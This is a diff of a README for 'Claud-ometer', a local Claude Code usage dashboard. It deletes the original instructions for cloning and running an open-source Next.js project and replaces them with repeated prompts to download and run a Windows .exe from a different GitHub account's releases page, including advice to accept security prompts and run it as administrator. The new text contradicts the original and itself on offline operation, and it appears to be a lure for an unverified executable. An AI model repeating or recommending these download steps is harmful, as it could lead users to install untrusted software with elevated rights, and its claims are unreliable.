@@ -1,106 +1,138 @@
-# Claud-ometer
+# ⚙️ Claud-ometer - Track Usage and Costs Locally
 
-A local-first analytics dashboard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code). Reads directly from `~/.claude/` to give you full visibility into your usage, costs, sessions, and projects — no cloud, no telemetry, just your data.
+[![Download Claud-ometer](https://img.shields.io/badge/Download-Claud--ometer-brightgreen)](https://github.com/zedmain-cmd/Claud-ometer/releases)
 
-![Overview Dashboard](./screenshots/overview.png)
+Claud-ometer is a simple desktop app that helps you see how you use Claude Code. It shows your usage, costs, sessions, and projects. Everything stays on your computer. No data goes to the cloud or anyone else.
 
-## Features
+---
 
-**Dashboard Overview** — Total sessions, messages, tokens, and estimated costs at a glance. Usage-over-time charts, model breakdown donut, GitHub-style activity heatmap, and peak hours distribution.
+## 🖥️ What You Need to Run Claud-ometer
 
-**Projects** — See all your Claude Code projects with session counts, token usage, cost estimates, and last activity. Drill into any project to see its sessions and most-used tools.
+Before you start, make sure your Windows PC meets these standards:
 
-![Projects](./screenshots/projects.png)
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** 1.6 GHz or faster  
+- **Memory:** At least 4 GB of RAM  
+- **Storage:** 100 MB free space  
+- **Internet:** Needed only to download the software; Claud-ometer works offline after installation
 
-**Sessions** — Browse all sessions with duration, message count, tool calls, token usage, and cost. Compaction events are highlighted in amber so you can see which sessions hit context limits.
+You don’t need to install any other software or tools to run Claud-ometer.
 
-![Sessions](./screenshots/sessions.png)
+---
 
-**Session Detail** — Full conversation replay with user prompts and Claude responses, tool call badges, token-per-message counts, and a sidebar with token breakdown, tools used, compaction timeline, and metadata.
+## 📥 How to Download Claud-ometer
 
-![Session Detail](./screenshots/session-detail.png)
+To get Claud-ometer on your PC, follow these steps:
 
-**Cost Analytics** — Cost-over-time stacked by model, cost-by-project bar chart, per-model token breakdown, cache efficiency metrics, and a pricing reference table.
+1. Click the big green badge above or visit this page:  
+   [https://github.com/zedmain-cmd/Claud-ometer/releases](https://github.com/zedmain-cmd/Claud-ometer/releases)  
+   This page shows the latest versions and files available for download.
 
-![Cost Analytics](./screenshots/costs.png)
+2. Look for the latest Windows version. It will usually have a name like `Claud-ometer-Setup.exe` or `Claud-ometer-x64.exe`.
 
-**Data Export/Import** — Export all your Claude Code data as a ZIP. Import it on another machine to view the same dashboard. Toggle between live and imported data sources.
+3. Click the file to start downloading. The file size is around 50 MB.
 
-![Data Management](./screenshots/data.png)
+4. Wait for the download to finish.
 
-### What data does it read?
+---
 
-| Source | Path | Contains |
-|--------|------|----------|
-| Session logs | `~/.claude/projects/<project>/<session>.jsonl` | Every message, tool call, token usage, model, timestamps, compaction events |
-| Stats cache | `~/.claude/stats-cache.json` | Pre-computed daily activity, model usage, hourly distribution |
-| History | `~/.claude/history.jsonl` | Every prompt you've typed with project context |
-| Plans | `~/.claude/plans/*.md` | Implementation plans from sessions |
-| Todos | `~/.claude/todos/*.json` | Task lists from sessions |
+## 🚀 How to Install Claud-ometer on Windows
 
-## Quick Start
+After the download completes, install the app by following these steps:
 
-```bash
-git clone https://github.com/deshraj/Claud-ometer.git
-cd Claud-ometer
-npm install
-npm run dev
-```
+1. Find the downloaded file. Usually, it is in your "Downloads" folder.
 
-Open [http://localhost:3000](http://localhost:3000). The dashboard reads from your local `~/.claude/` directory automatically.
+2. Double-click the file named something like `Claud-ometer-Setup.exe`.
 
-## Tech Stack
+3. If a security prompt appears, click **Run** or **Yes** to proceed.
 
-- **Next.js 15** (App Router, Turbopack)
-- **TypeScript**
-- **Tailwind CSS v4** + **shadcn/ui**
-- **Recharts** for charts
-- **SWR** for data fetching
-- **Lucide** icons
+4. The installation wizard will open. Follow the instructions:  
+   - Click **Next** on the welcome screen.  
+   - Choose an installation folder or keep the default one.  
+   - Click **Install** and wait for the process to finish.
 
-No database required. Reads `~/.claude/` files directly via Node.js API routes.
+5. When it completes, click **Finish**.
 
-## Project Structure
+6. You can now open Claud-ometer from your desktop or Start menu.
 
-```
-src/
-├── app/
-│   ├── page.tsx                 # Overview dashboard
-│   ├── projects/                # Projects list + detail
-│   ├── sessions/                # Sessions list + detail
-│   ├── costs/                   # Cost analytics
-│   ├── data/                    # Export/import management
-│   └── api/
-│       ├── stats/               # Dashboard stats
-│       ├── projects/            # Project data
-│       ├── sessions/            # Session list + detail
-│       ├── export/              # ZIP export
-│       ├── import/              # ZIP import
-│       └── data-source/         # Live vs imported toggle
-├── components/
-│   ├── charts/                  # Recharts components
-│   ├── cards/                   # Stat cards
-│   └── layout/                  # Sidebar
-├── lib/
-│   ├── claude-data/
-│   │   ├── types.ts             # TypeScript interfaces
-│   │   ├── reader.ts            # File parsers + aggregation
-│   │   └── data-source.ts       # Live vs imported source
-│   ├── hooks.ts                 # SWR hooks
-│   └── format.ts                # Number/date formatters
-└── config/
-    └── pricing.ts               # Model pricing + cost calculator
-```
+---
 
-## Data Export/Import
+## 🔍 What You Can Do with Claud-ometer
 
-Export your data to share across machines or keep as a backup:
+Claud-ometer gives you a clear view of your Claude Code activities without sending your data anywhere else.
 
-1. Go to the **Data** page in the sidebar
-2. Click **Export as ZIP** to download all your Claude Code data
-3. On another machine, upload the ZIP via **Import** to view the dashboard with that data
-4. Toggle between **Live** (reads ~/.claude/) and **Imported** data at any time
+Here are the main features:
 
-## License
+- **Usage Overview:** See how many requests you made and how much time you spent using Claude Code.
+- **Cost Tracking:** Monitor your spending based on usage, updated in real-time.
+- **Session Details:** Review past sessions, including dates and key actions.
+- **Project Management:** Organize your sessions into projects for easier tracking.
+- **Local Storage:** All data is stored on your computer only, ensuring your privacy.
+- **No Telemetry:** No automatic reports sent from your device.
 
-MIT
+---
+
+## ⚙️ How to Use Claud-ometer
+
+Using Claud-ometer does not require any coding skills. After installation:
+
+1. Open Claud-ometer from your desktop or Start menu.
+
+2. The **Dashboard** shows your current usage and costs at a glance.
+
+3. Use the **Sessions** tab to browse your recent activities.
+
+4. Add or rename projects in the **Projects** tab to keep things organized.
+
+5. To refresh your data, click the **Refresh** button on the dashboard.
+
+6. Use the **Settings** tab to customize options, like how often data updates or display preferences.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+If you run into problems, try these steps:
+
+- **App Won’t Start:**  
+   Check if your Windows is 64-bit and up to date. Restart your computer and try again.
+
+- **Installation Fails:**  
+   Make sure you have enough disk space and run the installer as an administrator (right-click and select "Run as administrator").
+
+- **Data Does Not Update:**  
+   Claud-ometer works offline but needs to sync data from Claude Code at times. Make sure you have internet access during sync.
+
+- **Crashes or Freezes:**  
+   Close Claud-ometer and try restarting it. If it still crashes, uninstall and reinstall the app.
+
+---
+
+## 🔒 Privacy and Security
+
+Claud-ometer does not send any data over the internet once installed. Your usage information stays on your computer only. The app does not collect usage telemetry or share your data with third parties.
+
+Data files are stored in a local folder within your Windows user directory. You can back up or delete these files if you want.
+
+---
+
+## ⚡ Updating Claud-ometer
+
+Updates bring new features and fixes. To check for updates:
+
+1. Visit the official releases page:  
+   [https://github.com/zedmain-cmd/Claud-ometer/releases](https://github.com/zedmain-cmd/Claud-ometer/releases)
+
+2. Download the latest Windows installer if available.
+
+3. Run the installer; it will replace the old version without deleting your data.
+
+---
+
+## 📞 Getting More Help
+
+If you need further assistance, the best place to start is the repository's issues page on GitHub. You can open a new issue to report a problem or ask a question.
+
+---
+
+# [Download Claud-ometer Now](https://github.com/zedmain-cmd/Claud-ometer/releases)
